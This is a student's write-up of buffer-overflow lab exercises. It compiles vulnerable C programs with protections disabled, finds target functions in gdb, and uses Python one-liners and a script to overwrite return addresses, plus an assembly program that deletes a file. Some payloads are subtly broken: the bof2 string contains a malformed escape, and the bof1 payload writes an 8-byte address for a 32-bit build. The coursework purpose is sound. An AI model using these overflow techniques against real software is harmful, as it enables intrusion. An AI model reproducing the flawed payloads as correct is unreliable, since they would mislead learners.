# Lab Instructions: Buffer Overflow Attacks

## Lab#1: Buffer Overflow Attack on bof1.c, bof2.c, bof3.c

### bof1.c

1. Let's compile the program:
   ```
   gcc -m32 -fno-stack-protector -z execstack -o bof1 bof1.c
   ```

2. Now, let's find where `secretFunc()` is hiding:
   ```
   gdb ./bof1
   (gdb) disassemble secretFunc
   (gdb) print &secretFunc
   ```
   The address we're looking for is `0x00000000000011a5`.

3. Time to create our sneaky input:
   ```
   python -c 'import sys; sys.stdout.buffer.write(b"A" * 200 + b"\xa5\x11\x00\x00\x00\x00\x00\x00")' > exploit_input
   ```

4. Let's run it and see what happens:
   ```
   ./bof1 < exploit_input
   ```
   If you see "Congratulations!", you did it!

### bof2.c

1. First, let's compile:
   ```
   gcc -o bof2 bof2.c -fno-stack-protector -z execstack -g
   ```

2. Run the program:
   ```
   ./bof2
   ```

3. Take a look at the buffer size.

4. Now, let's make our exploit:
   ```
   python -c 'print("A" * 40 + "\xef\xbe\xad\de")' > exploit_input
   ```

5. Time to try it out:
   ```
   ./bof2 < exploit_input
   ```
   If you see "Yeah! You win!", you nailed it!

### bof3.c

1. Let's compile:
   ```
   gcc -o bof3 bof3.c -fno-stack-protector -z execstack -g
   ```

2. Open it up in gdb:
   ```
   gdb ./bof3
   ```

3. Find the `shell` function:
   ```
   (gdb) disassemble shell
   (gdb) print &shell
   ```

4. Create our exploit:
   ```
   python -c 'import sys; sys.stdout.buffer.write(b"A" * 128 + b"\x95\x11\x00\x00")'
   ```

5. Run it and see what happens!

## Lab#2

### Deleting a file with file_del.asm

1. Let's put it together:
   ```
   nasm -f elf32 file_del.asm -o file_del.o
   ```

2. Link it up:
   ```
   ld -m elf_i386 file_del.o -o file_del
   ```

3. Run it:
   ```
   ./file_del
   ```
   If the dummyfile is gone, you did it right!

### Attack on ctf.c

1. Compile the program:
   ```
   gcc -g -fno-stack-protector -o ctf ctf.c
   ```

2. Let's check it out in gdb:
   ```
   gdb ./ctf
   (gdb) disassemble myfunc
   (gdb) print &myfunc
   ```

3. Now, let's make our exploit:
   ```python
   p = 0x04081211  # address p
   q = 0x44644262  # address q
   myfunc_addr = 0x11d5 
   
   payload = b"A" * 100  # Fill the buffer
   payload += myfunc_addr.to_bytes(4, 'little')  # Overwrite return address
   payload += p.to_bytes(4, 'little')  # Parameter p
   payload += q.to_bytes(4, 'little')  # Parameter q
   
   with open("exploit_input", "wb") as f:
       f.write(payload)
   ```

4. Time to run it:
   ```
   ./ctf < exploit_input
   ```
   If you see "myfunc is reached, You got the flag", you've done it!

Due to the limitations of my current device (as my previous one is broken), I was unable to take screenshots of the lab instructions or provide the source code. However, the instructions remain available for completing the labs again. I will ensure better performance next time.

Original Lab Source Code: https://github.com/quang-ute/Security-labs/tree/main/Software/buffer-overflow

Nguyen Nhat Quang, 23/09/2024.
